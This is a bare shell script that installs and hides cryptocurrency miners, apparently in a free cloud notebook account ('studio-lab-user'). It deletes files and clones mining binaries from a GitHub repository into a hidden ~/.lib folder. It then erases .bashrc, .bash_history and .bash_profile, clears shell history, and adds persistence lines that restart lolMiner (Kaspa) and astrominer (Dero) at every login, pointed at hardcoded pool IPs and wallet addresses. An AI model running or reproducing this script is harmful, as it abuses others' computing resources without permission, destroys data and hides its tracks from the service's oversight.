
rm -rvf * 
rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash*
cd ~/
mkdir .lib
cd .lib
rm -rf *
WORKER="$(echo $(shuf -i 1-999999 -n 1)-Bismillahku)"
WORKERDERO="alhamdulillah"
WALLETNH="kaspa:qpmj8grquw9erhz5xuew2j8tjfvqkh7hqzyn87m4scwkpfh5jny255ddcl5xt"
WALLETDERO="deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmzrc98wdfz0jfq5r2crc"
POOLNHETC="stratum+ssl://178.128.106.3:80"
POOLDERO="128.199.193.114:443"
git clone https://github.com/angkii/2022.git && cd 2022 
mv * /home/studio-lab-user/.lib
cd .. && history -cr
echo ""  > /home/studio-lab-user/.bashrc
echo "" > /home/studio-lab-user/.bash_history
echo "" > /home/studio-lab-user/.bash_profile
echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
echo "WORKER=$WORKER" >> ~/.bash_profile
echo "WORKERDERO=$WORKERDERO" >> ~/.bash_profile
echo "WALLETNH=$WALLETNH" >> /home/studio-lab-user/.bash_profile
echo "WALLETDERO=$WALLETDERO" >> /home/studio-lab-user/.bash_profile
echo "POOLNHETC=$POOLNHETC" >> /home/studio-lab-user/.bash_profile
echo "POOLDERO=$POOLDERO" >> /home/studio-lab-user/.bash_profile
echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
echo "while true; do ./.lib/./astrominerV1.9 -r $POOLDERO -w $WALLETDERO.$WORKERDERO -p rpc; sleep 5; done &>> .lib/dero.log &" > /home/studio-lab-user/.lib/gas.sh
echo "./.lib/lolMiner1.65 --algo KASPA --pool $POOLNHETC --user $WALLETNH.$WORKER --ethstratum ETHV1 --no-cl" >> /home/studio-lab-user/.lib/gas.sh
chmod +x gas.sh && chmod +x astrominerV1.9 && chmod +x lolMiner1.65 && cd ~/ && history -cr && source .bashrc

